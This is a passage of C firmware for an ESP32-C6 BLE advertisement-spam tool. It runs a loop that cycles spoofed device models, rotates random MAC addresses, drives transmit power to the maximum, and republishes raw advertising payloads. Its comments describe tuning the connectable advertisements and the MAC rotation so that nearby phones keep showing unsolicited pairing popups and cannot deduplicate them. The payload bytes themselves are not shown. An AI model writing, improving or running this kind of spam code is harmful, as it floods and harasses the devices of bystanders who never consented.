 * (ADV_STOP / SET_STATIC_RAND_ADDR / ADV_DATA_RAW_SET / ADV_START). Returning
 * "true" for whichever token shows up first desynchronises the cycle: one
 * stale token shifts every subsequent wait by one step and the loop ends up
 * believing advertising is active when the controller never confirmed it.
 *
 * gap_sync.completed is snapshotted here so that a completion which already
 * happened before this wait started is recognised as stale and skipped,
 * instead of being consumed as if it were the answer. The decision itself
 * lives in bt_spam_gap_sync.c, which has host unit tests.
 */
static bool wait_gap_event(esp_gap_ble_cb_event_t wanted,
                           esp_err_t ret,
                           uint32_t mark,
                           TickType_t timeout) {
  if (ret != ESP_OK || adv_sem == NULL) {
    return false;
  }

  TickType_t deadline = xTaskGetTickCount() + timeout;
  for (;;) {
    if (!bt_spam_gap_sync_has_new(&gap_sync, mark)) {
      /* xSemaphoreTake() below just consumed a token for a completion that
         happened before this wait started: a leftover. Keep waiting for the
         one we actually care about. */
      TickType_t now = xTaskGetTickCount();
      if ((int32_t) (now - deadline) >= 0) {
        return false;
      }
      if (xSemaphoreTake(adv_sem, deadline - now) != pdTRUE) {
        return false;
      }
      continue;
    }

    /* Absorb this completion and decide whether it is our answer. */
    mark = bt_spam_gap_sync_mark(&gap_sync);
    if (bt_spam_gap_sync_matches(&gap_sync, wanted)) {
      return bt_spam_gap_sync_succeeded(&gap_sync);
    }

    if ((int32_t) (xTaskGetTickCount() - deadline) >= 0) {
      return false;
    }
  }
}

/*
 * Background task: drives the advertising dwell timer and payload cycling.
 * Synchronized with Bluedroid GAP events via adv_sem.
 */
static void start_adv(void* pvParameters) {
  uint8_t payload_buffer[31];
  min_free_heap_during_spam = heap_caps_get_free_size(MALLOC_CAP_8BIT);

  /* Stop any existing advertising before setting random address */
  drain_sem();
  uint32_t init_stop_mark = bt_spam_gap_sync_mark(&gap_sync);
  esp_err_t init_stop_ret = esp_ble_gap_stop_advertising();
  if (init_stop_ret == ESP_OK) {
    wait_gap_event(ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT, init_stop_ret,
                   init_stop_mark, pdMS_TO_TICKS(150));
  }
  is_advertising_active = false;

  esp_bd_addr_t rand_addr;
  generate_random_mac(rand_addr);
  drain_sem();
  uint32_t init_mac_mark = bt_spam_gap_sync_mark(&gap_sync);
  esp_err_t init_mac_ret = esp_ble_gap_set_rand_addr(rand_addr);
  wait_gap_event(ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT, init_mac_ret,
                 init_mac_mark, pdMS_TO_TICKS(150));

  ESP_LOGI(TAG, "start_adv task started (%d active models, %d KB free heap)",
           active_indices_count, (int) (min_free_heap_during_spam / 1024));

  while (running_task) {
    if (active_indices_count == 0) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }

    uint8_t model_idx = active_indices[adv_index];

    /* Update display immediately at cycle start */
    if (display_records_cb != NULL && running_task) {
      display_records_cb(spam_models[model_idx].name);
    }

    /* Heap monitoring - log every 100 cycles (~25 seconds at 250ms/cycle) */
    cycle_count++;
    if (cycle_count - last_heap_log_cycle >= 100) {
      size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
      size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
      size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
      if (free_heap < min_free_heap_during_spam) {
        min_free_heap_during_spam = free_heap;
      }
      float fragmentation = 0.0f;
      if (free_heap > 0) {
        fragmentation =
            ((float) (free_heap - largest_block) / (float) free_heap) * 100.0f;
      }
      ESP_LOGI(TAG,
               "Heap: free=%zu KB, min=%zu KB, largest=%zu KB, frag=%.1f%%",
               free_heap / 1024, min_free / 1024, largest_block / 1024,
               fragmentation);
      last_heap_log_cycle = cycle_count;
    }

    /* 1. Rotate the MAC every SPAM_MAC_ROTATION_CYCLES cycles, and only then
     *    tear the advertising down. Peers that raise a pairing popup need a
     *    connectable advertisement (ADV_TYPE_IND) that survives long enough to
     *    be scanned and answered, and they cache sightings per address: a new
     *    random MAC plus a stop/start every single cycle (~250 ms) gave them
     *    neither a stable identity nor a usable connection window, so no popup
     *    ever appeared. Payload changes are pushed on the fly instead, which
     *    keeps the radio advertising continuously. */
    bool rotate_mac = (cycle_count % SPAM_MAC_ROTATION_CYCLES) == 0;

    if (rotate_mac || !is_advertising_active) {
      drain_sem();
      uint32_t stop_mark = bt_spam_gap_sync_mark(&gap_sync);
      esp_err_t stop_ret = esp_ble_gap_stop_advertising();
      if (stop_ret == ESP_OK) {
        wait_gap_event(ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT, stop_ret, stop_mark,
                       pdMS_TO_TICKS(150));
      }
      is_advertising_active = false;

      if (!running_task) {
        break;
      }

      /* 2. Fresh static random MAC, so a peer that already cached this address
       *    is not deduplicated on the next rotation. */
      generate_random_mac(rand_addr);
      drain_sem();
      uint32_t mac_mark = bt_spam_gap_sync_mark(&gap_sync);
      esp_err_t mac_ret = esp_ble_gap_set_rand_addr(rand_addr);
      if (!wait_gap_event(ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT, mac_ret,
                          mac_mark, pdMS_TO_TICKS(150))) {
        ESP_LOGW(TAG, "random address was not accepted, retrying next cycle");
        vTaskDelay(pdMS_TO_TICKS(15));
        if (!running_task) {
          break;
        }
      }
    }

    /* 3. Prepare payload with dynamic randomized ephemeral fields */
    uint8_t payload_len = prepare_payload(model_idx, payload_buffer);

    /* 4. Publish the new payload. Valid to call while advertising: the stack
     *    swaps the data in without tearing the advertisement down. */
    drain_sem();
    uint32_t data_mark = bt_spam_gap_sync_mark(&gap_sync);
    esp_err_t ret =
        esp_ble_gap_config_adv_data_raw(payload_buffer, payload_len);
    if (!wait_gap_event(ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT, ret,
                        data_mark, pdMS_TO_TICKS(150))) {
      ESP_LOGW(TAG, "advertising data was not accepted, retrying next cycle");
      vTaskDelay(pdMS_TO_TICKS(15));
      if (!running_task) {
        break;
      }
    }

    if (!running_task) {
      break;
    }

    /* 5. Start advertising only when it is not already running. */
    if (!is_advertising_active) {
      drain_sem();
      uint32_t start_mark = bt_spam_gap_sync_mark(&gap_sync);
      ret = esp_ble_gap_start_advertising(&ble_adv_params);
      if (wait_gap_event(ESP_GAP_BLE_ADV_START_COMPLETE_EVT, ret, start_mark,
                         pdMS_TO_TICKS(150))) {
        is_advertising_active = true;
      } else {
        is_advertising_active = false;
        /* Back off instead of hammering: a refused start is the expected state
           while a peer holds the link, and retrying every 20 ms only floods the
           log and churns the controller. The peer drops the link shortly after
           pairing, and the next attempt picks the radio back up. */
        vTaskDelay(pdMS_TO_TICKS(300));
      }
    }

    /* 6. Dwell for ~250ms in 50ms slices for fast exit response */
    for (int i = 0; i < 5 && running_task; i++) {
      vTaskDelay(pdMS_TO_TICKS(50));
    }

    /* 7. Advance to next model within current active mode */
    adv_index = (adv_index + 1) % active_indices_count;
  }

  /* Cleanup on task exit */
  if (is_advertising_active) {
    esp_ble_gap_stop_advertising();
    is_advertising_active = false;
  }

  /* Final heap report */
  size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
  size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
  ESP_LOGI(TAG,
           "Spam stopped. Final heap: free=%zu KB, min during run=%zu KB, "
           "overall min=%zu KB",
           free_heap / 1024, min_free_heap_during_spam / 1024, min_free / 1024);
  cycle_count = 0;
  last_heap_log_cycle = 0;
  min_free_heap_during_spam = 0;

  adv_task_handle = NULL;
  adv_task_running = false;
  vTaskDelete(NULL);
}

void bt_spam_register_cb(bt_spam_cb_display callback) {
  display_records_cb = callback;
}

void bt_spam_register_connect_cb(bt_spam_cb_connect callback) {
  connect_records_cb = callback;
}

bool bt_spam_is_running(void) {
  return running_task;
}

void bt_spam_app_main(bt_spam_mode_t mode) {
  ESP_LOGI(TAG, "Starting BT Spam mode %d...", mode);

  esp_err_t ret = ESP_OK;

  /* Brings up the controller and Bluedroid, and holds a BLE claim for the whole
     session. The surveillance detector used to disable Bluedroid and deinit the
     controller whenever one of its windows ended, which pulled the stack out
     from under a running spam without warning; the lease makes that a no-op
     while we are alive. */
  ret = radio_lease_ble_acquire();
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "could not acquire the BLE stack: %s", esp_err_to_name(ret));
    return;
  }

  /* Spam needs the radio completely idle before it can work at all: the gate
   * is taken *before* stopping the scan so no scanner's restart loop re-arms
   * a scan behind our back (the restart loops of the bt_gattc consumers check
   * radio_lease_ble_scan_allowed() before re-arming). */
  radio_lease_ble_block_scan();

  /* The random address can only be programmed while neither advertising nor
      scanning, and advertising can only start once a random address exists, so
     a scan left running by another BLE app (gattcmd, trackers, the ADV scanner)
      deadlocks the two calls against each other:
          "Advertising or scanning now, can't set randaddress"
          "No random address yet, please set random address and try"
      and spam never transmits. Stopping the scan here is what gives this app
     the exclusive radio it needs. */
  if (esp_ble_gap_stop_scanning() != ESP_OK) {
    ESP_LOGD(TAG, "no scan to stop before starting spam");
  }
  if (adv_sem == NULL) {
    adv_sem = xSemaphoreCreateBinary();
    if (adv_sem == NULL) {
      ESP_LOGE(TAG, "Failed to create adv_sem");
      goto error;
    }
  }

  // Register our GAP callback via the central dispatcher so that other
  // modules (bt_gatts, ble_hid, surv_radio, gattcmd) can also receive GAP
  // events without overwriting each other's registration.
  ret = gap_dispatcher_register(esp_gap_cb);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "gap_dispatcher_register failed: %s", esp_err_to_name(ret));
    goto error;
  }
  gap_callback_registered = true;

  /* Set maximum RF TX power on ESP32-C6 for proximity detection and RSSI
   * trigger */
  if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20) != ESP_OK) {
    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P15) != ESP_OK) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    }
  }
  if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P20) !=
      ESP_OK) {
    if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P15) !=
        ESP_OK) {
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    }
  }

  current_mode = mode;
  rebuild_active_indices(current_mode);
  adv_index = 0;

  /* Stop any advertising in progress before starting task */
  drain_sem();
  uint32_t stop_mark = bt_spam_gap_sync_mark(&gap_sync);
  esp_err_t stop_ret = esp_ble_gap_stop_advertising();
  if (stop_ret == ESP_OK) {
    wait_gap_event(ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT, stop_ret, stop_mark,
                   pdMS_TO_TICKS(100));
  }
  drain_sem();
  bt_spam_gap_sync_reset(&gap_sync);
  is_advertising_active = false;

  running_task = true;
  adv_task_running = true;
  BaseType_t task_ret =
      xTaskCreate(&start_adv, "bt_spam_adv", 4096, NULL, 5, &adv_task_handle);
  if (task_ret != pdPASS) {
    ESP_LOGE(TAG, "Failed to create start_adv task: %d", (int) task_ret);
    running_task = false;
    adv_task_running = false;
    goto error;
  }
  return;

error:
  /* Every failure path above already holds a BLE claim (and, from the second
   * one on, a dispatcher registration): unminding them here would leak the
   * lease forever, so the stack could never be torn down again. */
  if (gap_callback_registered) {
    gap_dispatcher_unregister(esp_gap_cb);
    gap_callback_registered = false;
  }
  radio_lease_ble_unblock_scan();
  radio_lease_ble_release();
}

void bt_spam_app_stop(void) {
  running_task = false;
  display_records_cb = NULL;

  /* Unblock the waiting task. It polls `running_task` between every GAP step
     and each step is bounded by wait_gap_event()'s timeout, so it leaves the
     loop on its own. */
  if (adv_sem != NULL) {
    xSemaphoreGive(adv_sem);
  }

  /* Wait for task to exit cleanly - task cleans up advertising on exit */
  if (adv_task_running) {
    uint32_t retries = 200; /* 200 x 10ms = 2s max wait */
    while (adv_task_running && retries-- > 0) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (adv_task_running) {
      ESP_LOGW(TAG, "Adv task didn't exit cleanly, forcing delete");
      /* Snapshot the handle and only delete while it is still published:
       * the task NULLs its own handle right before self-deleting, and
       * vTaskDelete(NULL) would delete THIS task (the caller, usually the
       * menus thread) instead. */
      TaskHandle_t task_to_delete = adv_task_handle;
      if (task_to_delete != NULL &&
          task_to_delete != xTaskGetCurrentTaskHandle()) {
        vTaskDelete(task_to_delete);
      }
      adv_task_handle = NULL;
      adv_task_running = false;
    }
  }

  /* Only unregister once the task is gone. Unregistering earlier left the adv
     task blocked on GAP events that could no longer be delivered, and the
     follow-up stop raced a task that was being force-deleted. */
  if (gap_callback_registered) {
    gap_dispatcher_unregister(esp_gap_cb);
    gap_callback_registered = false;
  }

  /* Ensure advertising is stopped at the controller level */
  if (is_advertising_active) {
    esp_ble_gap_stop_advertising();
    /* Wait for stop event */
    vTaskDelay(pdMS_TO_TICKS(100));
    is_advertising_active = false;
  }

  /* Note: We don't deinit bluedroid/controller here because they may be
   * used by other modules. They are initialized once and kept alive. */
}

void bt_spam_app_deinit(void) {
  bt_spam_app_stop();
  /* Gives the BLE claim back; the stack is only torn down when this was the
      last claim, which radio_lease tracks centrally. */
  radio_lease_ble_release();
  /* Only now may the scanners take the radio again. */
  radio_lease_ble_unblock_scan();

  if (adv_sem != NULL) {
    vSemaphoreDelete(adv_sem);
    adv_sem = NULL;
  }

  bt_spam_gap_sync_reset(&gap_sync);
  gap_callback_registered = false;
  display_records_cb = NULL;
}

esp_err_t bt_spam_set_tx_power(esp_power_level_t power_level) {
  esp_err_t ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, power_level);
  if (ret == ESP_OK) {
    ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, power_level);
  }
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "TX power set to %d dBm", power_level);
  }
  return ret;
}

esp_err_t bt_spam_set_adv_interval(uint16_t min_interval,
                                   uint16_t max_interval) {
  if (min_interval > max_interval || min_interval < 0x20) {
    return ESP_ERR_INVALID_ARG;
  }
  ble_adv_params.adv_int_min = min_interval;
  ble_adv_params.adv_int_max = max_interval;

  /* The adv loop owns ble_adv_params/is_advertising_active and re-issues
     start_advertising() every cycle, so restarting the radio from here raced
     it and stole its semaphore tokens. Leave the restart to the loop: it
     picks up the new interval on its next cycle. */
  ESP_LOGI(TAG, "Adv interval set: min=0x%04x, max=0x%04x", min_interval,
           max_interval);
  return ESP_OK;
}

esp_err_t bt_spam_get_heap_stats(uint32_t* free_kb,
                                 uint32_t* min_kb,
                                 float* fragmentation) {
  if (free_kb == NULL || min_kb == NULL || fragmentation == NULL) {
    return ESP_ERR_INVALID_ARG;
  }
  size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
  size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
  size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);

  *free_kb = free_heap / 1024;
  *min_kb = min_free / 1024;

  if (free_heap > 0) {
    *fragmentation =
        ((float) (free_heap - largest_block) / (float) free_heap) * 100.0f;
  } else {
    *fragmentation = 100.0f;
  }
  return ESP_OK;
}

static bt_spam_power_profile_t current_power_profile = BT_SPAM_POWER_HIGH;

esp_err_t bt_spam_set_power_profile(bt_spam_power_profile_t profile) {
  if (profile > BT_SPAM_POWER_LOW) {
    return ESP_ERR_INVALID_ARG;
  }

  current_power_profile = profile;

  esp_err_t ret = ESP_OK;
  int applied_dbm = 0;
  switch (profile) {
    case BT_SPAM_POWER_HIGH: {
      /* ESP_PWR_LVL_P20 is the ceiling on ESP32-C6; fall back so a build with
         a capped PA still reports the level it really got. */
      esp_power_level_t want = ESP_PWR_LVL_P20;
      esp_power_level_t got;
      if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, want) == ESP_OK) {
        got = want;
      } else if (esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P15) ==
                 ESP_OK) {
        got = ESP_PWR_LVL_P15;
      } else {
        ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
        got = ESP_PWR_LVL_P9;
      }
      applied_dbm = (got == ESP_PWR_LVL_P20)   ? 20
                    : (got == ESP_PWR_LVL_P15) ? 15
                                               : 9;
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, got);
      ble_adv_params.adv_int_min = 0x20;  // 20ms
      ble_adv_params.adv_int_max = 0x30;  // 30ms
      break;
    }
    case BT_SPAM_POWER_BALANCED:
      ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P15);
      applied_dbm = 15;
      if (ret == ESP_OK) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P15);
      }
      ble_adv_params.adv_int_min = 0x30;  // 30ms
      ble_adv_params.adv_int_max = 0x50;  // 50ms
      break;
    case BT_SPAM_POWER_LOW:
      ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
      applied_dbm = 9;
      if (ret == ESP_OK) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
      }
      ble_adv_params.adv_int_min = 0x60;  // 60ms
      ble_adv_params.adv_int_max = 0x80;  // 80ms
      break;
    default:
      ret = ESP_ERR_INVALID_ARG;
      break;
  }

  /* Do not restart advertising here: ble_adv_params and is_advertising_active
     belong to the adv loop, which re-issues start_advertising() every cycle
     and picks the new interval up on its own. Restarting from the caller's
     task raced that loop and stole its completion tokens. */

  ESP_LOGI(TAG,
           "Power profile set to %d (TX power: %d dBm, adv interval: "
           "0x%04x-0x%04x)",
           profile, applied_dbm, ble_adv_params.adv_int_min,
           ble_adv_params.adv_int_max);
  return ret;
}

bt_spam_power_profile_t bt_spam_get_power_profile(void) {
  return current_power_profile;
}
